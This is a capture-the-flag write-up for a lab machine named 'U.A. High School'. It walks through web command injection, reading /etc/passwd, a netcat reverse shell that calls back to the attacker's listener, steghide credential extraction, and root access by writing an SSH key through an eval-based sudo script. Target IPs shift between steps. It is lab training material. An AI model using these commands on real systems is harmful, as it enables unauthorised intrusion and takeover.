# U.A. High School - HTB Writeup

**Machine Name:** U.A. High School  
**IP Address:** 10.10.11.182  
**Operating System:** Ubuntu Linux  
**Difficulty:** Easy  
**Author:** Unknown  
**Date of Writeup:** August 7, 2025

## Summary of Exploits and Vulnerabilities

- **RCE (Remote Command Execution)** via parameter injection in `index.php`
- **Sensitive file discovery** using steghide on corrupted image file
- **Privilege escalation** via unsafe `eval` usage in a root-executed Bash script (`feedback.sh`)
- **Root access** through SSH key injection

---

## Nmap Scan

```
nmap -p- -sV -sC -Pn --min-rate 1000 10.10.99.159
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

## Web Enumeration

Found a basic high school-themed website on port 80. Pages included:

- about.html
- admissions.html
- courses.html
- contact.html (contains a form, but no exploitable behavior)

### Fuzzing Main Directory

```
ffuf -u http://10.10.158.105/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -fs 4605 -t 100 -timeout 5
```

Discovered: `/assets`, `/index.html`, `/contact.html`, etc.

### Fuzzing /assets

```
ffuf -u http://10.10.158.105/assets/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -fs 4605 -t 100 -timeout 5
```

Interesting files:
- `/assets/index.php` (blank page)
- `/assets/images/oneforall.jpg`

### Parameter Fuzzing for RCE

```
ffuf -u http://10.10.158.105/assets/index.php?FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

Found nothing, so i tried passing a value to the parameter.

```
ffuf -u http://10.10.158.105/assets/index.php?FUZZ=id -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

Found working parameter: `cmd`

Now by visiting the link i got:

```
http://10.10.158.105/assets/index.php?cmd=id
=> dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
```

The string is Base64 encoded so i used Cyberchef to decode it from Base64
=> uid=33(www-data) gid=33(www-data) groups=33(www-data)

We see we are executing commands as www-data, we just found Command Injection or RCE (Remote Command Execution) at:

http://10.10.158.105/assets/index.php?cmd=id

And the response confirms we are executing commands as www-data, which is the typical web server user. We are now inside the machine (though through a limited command injection)we just executed the command id

Confirmed **command injection** vulnerability.

so i tried another commmand:
```
10.10.11.182/assets/index.php?cmd=cat%20/etc/passwd~
```
it gave an encoded response, once again we can use CyberChef to decipher it.
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
deku:x:1000:1000:deku:/home/deku:/bin/bash

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

We found out 2 active users, deku and root.

### Reverse Shell

Setup listener:

```
nc -lvnp 4444
```

Trigger reverse shell:

```
http://10.10.11.182/assets/index.php?cmd=nc+10.9.1.78+4444+-e+/bin/bash
```

Shell as `www-data` obtained.

## Loot Discovery

Found `Hidden_Content/passphrase.txt` with base64 content:

```
QWxsbWlnaHRGb3JFdmVyISEhCg== => AllmightForEver!!!
```

I then tried to log in trough SSH as deku with that password but it didnt work so i kept investigating.

### Steganography

In the assets folder there was another folder called Images that contained 2 images, yuei.jpg wich was a picture from the school and a broken image called oneforall.jpg, i decided to investigate it so i downloaded it using `wget http://10.10.11.182/assets/images/oneforall.jpg`

Image details didnt reveal much, so now i can try to fix it either by puttiing it on a website or by myself with hexeditor, i decided to do it myself since i dont wanna pay anything or log into anything, so i watched a youtube video about how to use it, and i found out my image code is wrong using hexeditpr: `hexeditor -b oneforall.jpg`

i found out the image is using PNG sgnature wich are the first values in the HEX code, so I replaced them with the right one for JPG which is `FF D8 FF E0 00 10 4A 46 49 46 00 01` and it worked, I can now see the image but dosent show anything special so now I'll try to use steghide to check if it has any hidden info

```
steghide --extract -sf oneforall.jpg
```
notes:

--extract: tells Steghide you want to pull hidden data out.

-sf: means stego file (the image that has hidden data).

It asked for apassword so i tried the one i found earlier `AllmightForEver!!!`, finally it gave me a file called creds.txt with:

```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

## User Access

```
ssh deku@10.10.11.182
Password: One?For?All_!!one1/A
```

Obtained `user.txt` and got the User flag.

## Privilege Escalation

Now that im in user deku to start previlege escalation, the first thing I'll do is Check what the user can run with sudo rights using `sudo -l`.

### Sudo Check

```
sudo -l
(ALL) /opt/NewComponent/feedback.sh
```

Output
```
User deku may run the following commands on ip-10-10-11-182:
    (ALL) /opt/NewComponent/feedback.sh
```

As we can see we can run feedback.sh file as sudo, so now we'll check whats inside:

```
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

This script basically collects user feedback, checks for potentially harmful special characters, and if the input is deemed safe, it saves the feedback to a log file. If the input contains restricted characters, it rejects the feedback and prompts the user to provide valid input.

After some research i found the `eval` command to be unsafe, `Eval` can execute any code within the input string, including malicious code. If user inputs are not properly validated, eval can become a significant security risk leading to `command injection`.

Because this file filtrates certain special character by running the file and attenting to use commands like ;cp /bin/bash /tmp/bash, will not work but looking at the filter in the program theres a special character that missing which is >.
Meaning we can still write to files like /etc/passwd or /root/.ssh/authorized_keys using >.

So what we can do here is bypass the filter and gain root SSH access by creating an SSH key pair with ssh-keygen once we run the script and input our key on /root/.ssh/authorized_keys, we can then be root through ssh. :)

### Script: `/opt/NewComponent/feedback.sh`

Turns out im severely retarded and i just spent an hour trying to figure out why it wasnt working, i forgot to run the file feedback.sh as sudo... I hate my life.

Moving on...

The script uses `eval` insecurely without filtering `>` character.

I first started by creating the SSH Key pair and named it writeup:

```
ssh-keygen -f writeup
chmod 600 writeup
```

Used the script to write public key to `/root/.ssh/authorized_keys`:

```
ssh-keygen       
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/morth/.ssh/id_ed25519): writeup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in writeup
Your public key has been saved in writeup.pub
The key fingerprint is:
SHA256:DYNE4QZ0BLwAgWtBWLd8fWbcsxypoGMH/PIBfDf8K2Q morth@kali
The key's randomart image is:
+--[ED25519 256]--+
|*=.o=+*.         |
|o..o.O o o . .   |
| ...o.X * O =    |
|..  .o * X = +   |
|.     = S E +    |
|     . = +   .   |
|        . . .    |
|           .     |
|                 |
+----[SHA256]-----+
```

then i gave it permissions:
```
chmod 600 writeup
```

Copied the public key so i can use it on the file
```
cat writeup.pub  
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe+Okf08WHl/6gq+4LEWcNyrMea9D5ucK/zimm066oS morth@kali
```

Then on the target machine i execute the command and put the key inside authorized_keys file(for the love of god dont forget to execute the file feedback.sh as `sudo`)

```
deku@ip-10-10-11-182:~$ sudo /opt/NewComponent/feedback.sh
[sudo] password for deku: 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe+Okf08WHl/6gq+4LEWcNyrMea9D5ucK/zimm066oS morth@kali > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe+Okf08WHl/6gq+4LEWcNyrMea9D5ucK/zimm066oS morth@kali > /root/.ssh/authorized_keys
```

Once thats done and there are no errors, we can then get root trough ssh:

### Root Access

```
ssh -i writeup root@10.10.11.182
```

```
root@ip-10-10-11-182:~# ls
root.txt  snap
root@ip-10-10-11-182:~# cat root.txt
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

...{..........}
```

Root shell obtained.

## Flags

- `user.txt` – found in `/home/deku`
- `root.txt` – accessible after root SSH access

---
